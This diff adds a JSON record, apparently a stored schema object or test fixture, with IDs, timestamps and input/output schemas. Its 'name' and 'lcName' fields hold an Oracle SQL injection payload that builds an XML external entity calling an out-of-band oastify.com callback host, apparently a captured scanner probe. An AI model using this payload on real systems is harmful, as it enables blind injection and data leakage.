@@ -1,0 +1,33 @@
+{
+	"createdTime":1741334397356,
+	"deleted":true,
+	"description":"SZHLUr",
+	"id":"67caa77d8780f31288254d1e",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":22743,
+	"lcName":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"utf-8\"?><!doctype root [ <!entity % mbcqy system \"http://kayrdyfrbuqk320lmjflx6j2ltrmfn3qrie82x.oasti'||'fy.com/\">%mbcqy;]>'),'/l') from dual)",
+	"modifiedTime":1741358660626,
+	"name":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % mbcqy SYSTEM \"http://kayrdyfrbuqk320lmjflx6j2ltrmfn3qrie82x.oasti'||'fy.com/\">%mbcqy;]>'),'/l') from dual)",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":22743,
+	"standard":false,
+	"version":1
+}
